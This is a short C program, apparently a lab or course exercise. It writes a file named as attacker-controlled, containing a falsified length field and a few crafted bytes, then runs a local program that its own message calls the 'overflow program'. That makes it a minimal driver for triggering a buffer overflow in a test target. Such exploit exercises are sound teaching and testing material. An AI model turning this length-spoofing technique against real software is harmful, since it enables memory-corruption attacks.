
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(){
	
	FILE* fout = fopen("attacker-controlled-file.txt", "wb");
	if (fout == NULL)
		perror("Error opening file attacker-controlled=file.txt\n");

	size_t fakeLength = 45;
	fwrite(&fakeLength, 1, sizeof(size_t), fout);
	
	void* fileContent = "\x0c\x00\x00\x00\x00\x00\x00\x00";

	fwrite(fileContent, 1, strlen(fileContent), fout);

	fclose(fout);
	
	char* arguments[] = {"one", "two", NULL};
	if (execvp("./test", arguments) == -1)
		printf("Error launching overflow program\n");


}
